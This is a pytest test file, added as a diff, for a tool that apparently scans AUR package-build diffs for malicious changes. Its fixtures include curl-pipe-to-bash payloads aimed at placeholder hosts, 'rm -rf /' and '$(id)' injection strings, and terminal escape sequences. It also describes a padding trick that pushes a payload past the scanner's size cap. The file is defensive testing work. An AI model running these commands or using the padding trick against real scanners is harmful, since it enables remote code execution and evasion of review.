@@ -1,0 +1,512 @@
+"""The security model, tested.
+
+``scripts/security_gates.py`` is the enforcement surface and CI runs it
+whole.  This file runs it too, so a claim in ``docs/security.md`` cannot
+break without a local ``pytest`` noticing, and adds the behavioural cases
+the gates assert only the shape of.
+"""
+
+import io
+import re
+import sys
+from pathlib import Path
+
+import pytest
+
+ROOT = Path(__file__).resolve().parent.parent
+sys.path.insert(0, str(ROOT / "scripts"))
+
+from trustsight.analysis import scan_diff  # noqa: E402
+from trustsight.config import (  # noqa: E402
+    enforce_fatal_rules,
+    load_config,
+    shipped_fatal_rule_ids,
+    shipped_rules,
+)
+from trustsight.coverage import (  # noqa: E402
+    DIFF_TRUNCATED,
+    INCOMPLETE_SUFFIX,
+    LINE_TRUNCATED,
+    TREE_NOT_ANALYZED,
+    UNRESOLVED_SOURCE,
+    describe,
+    fail_closed,
+    gaps_from,
+    oversized_lines,
+    qualified_band,
+    unresolved_source_lines,
+)
+from trustsight.safe_text import clean, safe_markup  # noqa: E402
+from trustsight.schema import PackageFact, ScoreEntry  # noqa: E402
+from trustsight.scoring import (  # noqa: E402
+    calculate_score,
+    verdict_label,
+    verdict_level,
+)
+
+HEADER = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n pkgname=demo\n pkgver=1.0\n"
+
+
+def _render_review(results, renderer):
+    """Render *results* through the real console, captured as text."""
+    from rich.console import Console
+
+    import trustsight.cli.display as display
+
+    buffer = io.StringIO()
+    saved = display._console
+    display._console = Console(file=buffer, force_terminal=False, width=200)
+    try:
+        renderer(results, 1, False, True, True, False)
+    finally:
+        display._console = saved
+    return buffer.getvalue()
+
+
+# --- the gates themselves -------------------------------------------------
+
+
+def test_every_security_gate_passes():
+    from security_gates import run_gates
+
+    failed = [g.name for g in run_gates() if not g.passed]
+    assert failed == [], f"security gates failing: {failed}"
+
+
+def test_the_doc_and_the_gates_name_the_same_invariants():
+    """A guarantee with no check, or a check with no guarantee, is a bug."""
+    from security_gates import gate_doc_lists_every_gate, run_gates
+
+    gates = [g for g in run_gates() if g.name != "docs/security.md matches the gates"]
+    assert gate_doc_lists_every_gate(gates).passed
+
+
+# --- coverage: what the run could not see ---------------------------------
+
+
+def test_unresolved_source_is_a_computed_source_line():
+    diff = HEADER + '+_url="$(curl -sIL -o /dev/null -w \'%{url_effective}\' "$_link")"\n'
+    assert unresolved_source_lines(diff)
+
+
+@pytest.mark.parametrize("line", [
+    '+source=("https://example.org/demo-$pkgver.tar.gz")',
+    '+source_x86_64=("$_base/demo.tar.gz")',
+    '+_url="https://example.org/demo.tar.gz"',
+    '+# _url="$(curl -s https://example.org/redirect)"',
+])
+def test_resolvable_or_commented_source_lines_are_not_a_gap(line):
+    assert unresolved_source_lines(HEADER + line + "\n") == []
+
+
+def test_removed_lines_are_not_a_gap():
+    """A maintainer deleting a computed source is closing the gap, not opening it."""
+    diff = HEADER + '-_url="$(curl -s https://example.org/redirect)"\n'
+    assert unresolved_source_lines(diff) == []
+
+
+@pytest.mark.parametrize("gap", [DIFF_TRUNCATED, TREE_NOT_ANALYZED, UNRESOLVED_SOURCE])
+@pytest.mark.parametrize("level", ["Low", "Medium"])
+def test_a_gap_forbids_a_clean_verdict(gap, level):
+    assert fail_closed(level, [gap], []) == "Inconclusive"
+
+
+@pytest.mark.parametrize("severity", ["HIGH", "CRITICAL", "FATAL"])
+def test_a_strong_finding_keeps_its_band_despite_a_gap(severity):
+    """Hiding a confirmed finding behind "inconclusive" would lose the signal."""
+    breakdown = [ScoreEntry(rule_id="R001", severity=severity, weight=25)]
+    assert fail_closed("Medium", [DIFF_TRUNCATED], breakdown) == "Medium"
+
+
+def test_a_complete_analysis_is_not_downgraded():
+    assert fail_closed("Low", [], []) == "Low"
+    assert fail_closed("Critical", [DIFF_TRUNCATED], []) == "Critical"
+
+
+def test_gaps_are_listed_in_a_stable_order():
+    gaps = gaps_from(diff_truncated=True, tree_analyzed=False,
+                     unresolved_sources=["_url=$(curl ...)"])
+    assert gaps == [DIFF_TRUNCATED, TREE_NOT_ANALYZED, UNRESOLVED_SOURCE]
+
+
+def test_describe_names_every_gap():
+    text = describe([DIFF_TRUNCATED, UNRESOLVED_SOURCE])
+    assert "size cap" in text and "computed at build time" in text
+    assert describe([]) == ""
+
+
+def test_coverage_appears_in_the_breakdown_without_scoring():
+    from trustsight.schema import NoveltyContext
+
+    score, breakdown, level = calculate_score(
+        [], {}, NoveltyContext(), coverage_gaps=[DIFF_TRUNCATED],
+    )
+    entries = [e for e in breakdown if e.rule_id == "COVERAGE"]
+    assert len(entries) == 1
+    assert entries[0].weight == 0
+    assert score == 0
+    assert level == "Inconclusive"
+
+
+def test_a_fatal_finding_still_caps_at_100_with_a_gap():
+    """The gap is recorded, but a FATAL verdict is not softened by it."""
+    from trustsight.schema import NoveltyContext
+
+    triggered = [{"rule_id": "R012", "severity": "FATAL", "name": "injection"}]
+    score, breakdown, level = calculate_score(
+        triggered, {}, NoveltyContext(), coverage_gaps=[DIFF_TRUNCATED],
+    )
+    assert score == 100 and level == "Critical"
+    assert any(e.rule_id == "COVERAGE" for e in breakdown)
+
+
+def test_a_truncated_diff_cannot_report_low(tmp_path):
+    """The padding bypass: pad past the cap, append the payload."""
+    config = load_config()
+    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 512}}
+    padding = "\n".join(f"+# pad {i}" for i in range(300))
+    diff = HEADER + padding + "\n+echo hello\n"
+
+    fact = scan_diff(diff, config=config, package_name="demo")
+    assert DIFF_TRUNCATED in fact.coverage_gaps
+    assert fact.risk == "Inconclusive"
+    assert verdict_level(fact) == "Inconclusive"
+
+
+def test_verdict_level_prefers_the_stored_band():
+    fact = PackageFact(final_score=0, risk="Inconclusive")
+    assert verdict_level(fact) == "Inconclusive"
+    assert verdict_level(PackageFact(final_score=90)) == "Critical"
+
+
+# --- the decoy seam: a gap always travels with the band -------------------
+
+
+@pytest.mark.parametrize("band", ["Low", "Medium", "High", "Critical"])
+def test_a_band_is_qualified_when_coverage_is_incomplete(band):
+    assert qualified_band(band, [DIFF_TRUNCATED]) == band + INCOMPLETE_SUFFIX
+    assert qualified_band(band, []) == band
+
+
+def test_inconclusive_is_not_qualified():
+    """It already says what the suffix would say."""
+    assert qualified_band("Inconclusive", [DIFF_TRUNCATED]) == "Inconclusive"
+
+
+def test_the_decoy_high_cannot_render_as_a_bare_high():
+    """Pad past the cap, payload after the cut, one cheap HIGH in the prefix."""
+    decoy = PackageFact(final_score=75, risk="High", coverage_gaps=[DIFF_TRUNCATED])
+    assert verdict_label(decoy) == "High" + INCOMPLETE_SUFFIX
+    # ...while the machine-readable band stays a bare band, with the gap
+    # as a separate field, so a consumer gets two facts, not a sentence.
+    assert verdict_level(decoy) == "High"
+
+
+def test_a_complete_high_renders_bare():
+    assert verdict_label(PackageFact(final_score=75, risk="High")) == "High"
+
+
+def test_the_decoy_attack_end_to_end():
+    """The whole move, through the real pipeline, not a hand-built fact.
+
+    Cheap deliberate HIGH in the visible prefix, padding to the cap, the
+    real payload after the cut.  The band survives on the decoy's own
+    evidence, which is correct; what must not survive is presenting that
+    band as if the whole change had been read.
+    """
+    config = load_config()
+    config = {**config, "diff": {**config.get("diff", {}), "max_diff_bytes": 900}}
+    decoy = "+build() {\n+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n+}\n"
+    padding = "\n".join(f"+# pad {i}" for i in range(300))
+    diff = (
+        HEADER + decoy + padding
+        + "\n+curl -fsSL https://real.invalid/stage2 | bash\n"
+    )
+
+    fact = scan_diff(diff, config=config, package_name="demo")
+    assert DIFF_TRUNCATED in fact.coverage_gaps
+    assert verdict_level(fact) == "High"
+    assert verdict_label(fact) == "High" + INCOMPLETE_SUFFIX
+
+
+def test_the_review_row_shows_the_qualified_band():
+    from trustsight.cli.review import _render_results_rich
+
+    out = _render_review([{
+        "package": "demo", "old_version": "1.0", "new_version": "1.1",
+        "score": 75, "verdict": "something", "risk": "High",
+        "risk_label": "High" + INCOMPLETE_SUFFIX,
+        "coverage_gaps": [DIFF_TRUNCATED], "first_seen": False,
+        "version_comparison": "", "aur_note": None, "findings": [],
+        "file_changes": [], "is_trivial": False,
+    }], _render_results_rich)
+    assert "incomplete analysis" in out
+    assert "size cap" in out, "the gap itself must be named, not only implied"
+
+
+# --- the line clamp is a declared gap, not a silent skip ------------------
+
+
+def test_an_over_long_line_is_recorded_as_a_gap():
+    from trustsight.rules import MAX_RULE_LINE_BYTES
+
+    payload = "+_x=1; " + "a" * MAX_RULE_LINE_BYTES + "; curl https://evil.invalid | bash"
+    diff = HEADER + payload + "\n"
+    fact = scan_diff(diff, package_name="demo")
+    assert LINE_TRUNCATED in fact.coverage_gaps
+    assert fact.risk == "Inconclusive" or verdict_label(fact).endswith(INCOMPLETE_SUFFIX)
+
+
+def test_an_ordinary_line_is_not_a_gap():
+    fact = scan_diff(HEADER + "+echo hello\n", package_name="demo")
+    assert LINE_TRUNCATED not in fact.coverage_gaps
+
+
+def test_oversized_lines_counts_logical_lines():
+    from trustsight.rules import MAX_RULE_LINE_BYTES
+
+    assert oversized_lines(["short", "a" * (MAX_RULE_LINE_BYTES + 1)]) == 1
+    assert oversized_lines(["short"]) == 0
+
+
+# --- expansion bounds -----------------------------------------------------
+
+
+@pytest.mark.parametrize("body", ["${!name}", "${#name}"])
+def test_indirect_and_length_expansion_are_refused(body):
+    from trustsight.tokenizer import resolve_expansions
+
+    text, fully = resolve_expansions(body, {"name": "target", "target": "curl evil"})
+    assert not fully
+    assert "curl" not in text
+
+
+def test_the_doubling_chain_is_bounded_and_not_silently_truncated():
+    from trustsight.tokenizer import _MAX_LINE_LEN, tokenize_and_resolve
+
+    lines = ["+a=" + "z" * 64]
+    for i in range(1, 24):
+        prev = "a" if i == 1 else f"v{i - 1}"
+        lines.append(f"+v{i}=${prev}${prev}")
+    diff = HEADER + "\n".join(lines) + "\n"
+
+    resolved, _unresolved = tokenize_and_resolve(diff)
+    assert all(len(s) <= _MAX_LINE_LEN for s in resolved)
+
+
+def test_the_dead_depth_constant_is_gone():
+    """A declared bound nothing applies reads like a guarantee."""
+    import trustsight.tokenizer as tokenizer
+
+    assert not hasattr(tokenizer, "_MAX_EXPANSION_DEPTH")
+
+
+# --- rendering is data-driven ---------------------------------------------
+
+
+def test_a_field_value_cannot_change_the_expansion():
+    from trustsight.verdict import _render
+
+    hostile = "{0.__class__} {package_name} {{nested}}"
+    entry = ScoreEntry(rule_id="R001", template="{match}", evidence={"match": hostile})
+    out = _render(entry, PackageFact(package_name="demo"))
+    assert hostile in out, "the value was re-expanded rather than substituted"
+
+
+def test_a_missing_template_field_falls_back_instead_of_raising():
+    from trustsight.verdict import _render
+
+    entry = ScoreEntry(rule_id="R001", reason="fallback text", template="{absent}")
+    assert "fallback text" in _render(entry, PackageFact())
+
+
+def test_nothing_in_the_rendering_path_reaches_the_network():
+    import trustsight.findings as findings
+    import trustsight.verdict as verdict
+
+    for module in (verdict, findings):
+        text = Path(module.__file__).read_text().lower()
+        for banned in ("openai", "anthropic", "urllib.request", "httpx", "requests"):
+            assert banned not in text
+
+
+# --- vercmp shape check ---------------------------------------------------
+
+
+@pytest.mark.parametrize("hostile", ["-h", "--help", "-1:2.0", "; rm -rf /", "", "-",
+                                     "1.0 --flag", "$(id)", "1.0\n-h"])
+def test_a_non_version_never_reaches_a_command_line(hostile):
+    from trustsight.discovery import _VERSION_ARG_RE
+
+    assert not _VERSION_ARG_RE.match(hostile)
+
+
+@pytest.mark.parametrize("version", ["1.0", "1:1.1.1w-1", "2.0.0.r15.g0a1b2c3-1",
+                                     "1.0_beta+2~rc1", "20240101-2"])
+def test_a_real_version_passes_the_shape_check(version):
+    from trustsight.discovery import _VERSION_ARG_RE
+
+    assert _VERSION_ARG_RE.match(version)
+
+
+# --- the baseline bound ---------------------------------------------------
+
+
+def test_a_baseline_cannot_supply_rules_or_weights():
+    from security_gates import gate_a_baseline_supplies_state_not_rules
+
+    gate = gate_a_baseline_supplies_state_not_rules()
+    assert gate.passed, gate.measured
+
+
+# --- FATAL integrity ------------------------------------------------------
+
+
+def test_the_protected_set_is_derived_not_hardcoded():
+    assert set(shipped_fatal_rule_ids()) == {"R012", "R013"}
+
+
+@pytest.mark.parametrize("rid", ["R012", "R013"])
+def test_a_deleted_fatal_rule_is_restored(rid):
+    effective, restored = enforce_fatal_rules(
+        [r for r in shipped_rules() if r["id"] != rid]
+    )
+    assert restored == [rid]
+    assert any(r["id"] == rid and r["severity"] == "FATAL" for r in effective)
+
+
+@pytest.mark.parametrize("rid", ["R012", "R013"])
+def test_a_downgraded_fatal_rule_is_restored(rid):
+    tampered = [
+        dict(r, severity="INFO") if r["id"] == rid else r for r in shipped_rules()
+    ]
+    effective, restored = enforce_fatal_rules(tampered)
+    assert restored == [rid]
+    assert all(r["severity"] == "FATAL" for r in effective if r["id"] == rid)
+
+
+def test_an_untouched_ruleset_is_left_alone():
+    effective, restored = enforce_fatal_rules(shipped_rules())
+    assert restored == []
+    assert len(effective) == len(shipped_rules())
+
+
+def test_a_user_added_rule_survives_enforcement():
+    """Restoring a FATAL rule must not drop anything the operator added."""
+    custom = {"id": "X999", "name": "local", "pattern": "zzz",
+              "severity": "LOW", "category": "custom"}
+    effective, _ = enforce_fatal_rules(
+        [r for r in shipped_rules() if r["id"] != "R012"] + [custom]
+    )
+    assert any(r["id"] == "X999" for r in effective)
+
+
+# --- output sanitisation --------------------------------------------------
+
+
+@pytest.mark.parametrize("hostile", [
+    "\x1b[2J\x1b[H",                  # clear screen, home cursor
+    "\x1b]8;;http://evil.invalid\x07",  # OSC hyperlink
+    "\x9b31m",                        # 8-bit CSI
+    "demo\x00\x07\x7f",               # bare control bytes
+    "line\nbreak\ttab",               # layout characters
+])
+def test_clean_removes_everything_a_terminal_acts_on(hostile):
+    out = clean(hostile)
+    assert not re.search(r"[\x00-\x08\x0b-\x1f\x7f-\x9f]", out)
+    assert "\x1b" not in out
+
+
+def test_clean_leaves_ordinary_text_alone():
+    for ordinary in ("python-requests", "1.2.3-1", "usr/lib/systemd/system/x.service",
+                     "Jörg Müller <j@example.org>"):
+        assert clean(ordinary) == ordinary
+
+
+def test_clean_truncates_on_request():
+    assert clean("a" * 100, limit=10) == "a" * 9 + "…"
+
+
+def test_safe_markup_neutralises_rich_tags():
+    assert safe_markup("[bold red]CLEAN[/]") == r"\[bold red]CLEAN\[/]"
+
+
+def test_an_unbalanced_tag_does_not_abort_the_render():
+    """A MarkupError used to kill the render of every later package."""
+    from rich.console import Console
+    from rich.table import Table
+
+    buffer = io.StringIO()
+    console = Console(file=buffer, force_terminal=False, width=120)
+    table = Table(show_header=False)
+    table.add_column()
+    table.add_row(safe_markup("[/not-a-tag"))
+    console.print(table)
+    assert "not-a-tag" in buffer.getvalue()
+
+
+def test_a_hostile_package_cannot_repaint_the_review_table():
+    from rich.console import Console
+
+    import trustsight.cli.display as display
+    import trustsight.cli.review as review
+
+    hostile = "\x1b[2J[green]VERDICT: CLEAN[/]"
+    results = [{
+        "package": hostile, "old_version": "1.0", "new_version": "1.1",
+        "score": 75, "verdict": hostile, "risk": "High", "first_seen": False,
+        "coverage_gaps": [], "version_comparison": "", "aur_note": None,
+        "findings": [{"rule_id": hostile, "file": hostile, "line": 1,
+                      "description": hostile, "template": "", "evidence": {},
+                      "severity": "HIGH", "weight": 25}],
+        "file_changes": [{"path": hostile, "status": "added"}],
+        "is_trivial": False,
+    }]
+
+    buffer = io.StringIO()
+    saved = display._console
+    display._console = Console(file=buffer, force_terminal=False, width=200)
+    try:
+        review._render_results_rich(results, 1, False, True, True, False)
+    finally:
+        display._console = saved
+
+    out = buffer.getvalue()
+    assert "\x1b" not in out
+    assert "[green]" in out, "markup was interpreted rather than printed"
+
+
+# --- the seed is not a control channel ------------------------------------
+
+
+def test_a_seed_cannot_rewrite_the_database():
+    from security_gates import gate_seed_cannot_rewrite_the_database
+
+    gate = gate_seed_cannot_rewrite_the_database()
+    assert gate.passed, gate.measured
+
+
+# --- bounded work on hostile input ----------------------------------------
+
+
+def test_rule_matching_clamps_its_input():
+    from trustsight.rules import MAX_RULE_LINE_BYTES, clamp
+
+    assert len(clamp("a" * (MAX_RULE_LINE_BYTES * 2))) == MAX_RULE_LINE_BYTES
+    assert clamp("short") == "short"
+
+
+def test_config_lists_are_data_not_patterns():
+    """A host or port list entry with a metacharacter must not become regex."""
+    from trustsight.config import _free_registrar_tld_pattern, _standard_port_pattern
+
+    re.compile(_standard_port_pattern())
+    re.compile(_free_registrar_tld_pattern())
+
+
+def test_the_metadata_fetch_is_bounded():
+    from trustsight.full_aur import metadata
+
+    assert metadata.HTTP_TIMEOUT > 0
+    assert metadata.MAX_RESPONSE_BYTES > 0
+    assert metadata.MAX_DECOMPRESSED_BYTES > 0
